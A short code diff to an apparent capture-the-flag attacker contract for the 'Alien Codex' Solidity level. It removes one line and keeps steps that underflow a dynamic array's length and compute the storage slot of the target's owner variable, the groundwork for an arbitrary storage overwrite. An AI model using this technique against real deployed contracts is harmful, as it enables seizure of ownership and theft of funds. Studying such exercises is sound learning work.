@@ -42,7 +42,6 @@ contract AlienCodexAttacker {
         i_target.make_contact();
         //retracting it will change the length to below its limits and cause an overflow
         i_target.retract(); // now codex.length is 2**256, since it undeflowed from 0 to the maximum
-        dynamicArrayPosition = keccak256(1);
         uint256 ownerSlot = TOTAL_CONTRACT_SLOTS -
             uint256(keccak256(abi.encode(1))) +
             1;
